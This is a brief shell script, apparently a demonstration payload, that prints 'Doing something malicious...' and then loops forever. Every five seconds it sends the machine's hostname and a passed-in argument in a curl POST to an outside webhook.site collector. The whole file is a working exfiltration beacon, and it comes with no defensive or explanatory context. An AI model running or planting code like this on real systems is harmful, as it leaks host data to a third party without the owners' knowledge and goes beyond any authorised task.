#!/bin/sh
clientdata=$1

while true; do
  echo "Doing something malicious..."
  echo "executing on $HOSTNAME"
  curl -X POST https://webhook.site/4a160954-e93b-4b75-b0c7-879ea53d1265 -H "Content-Type: application/json" -d '{"Hostname": '$HOSTNAME', "NotClientData": '$clientdata'}'  
  sleep 5
done
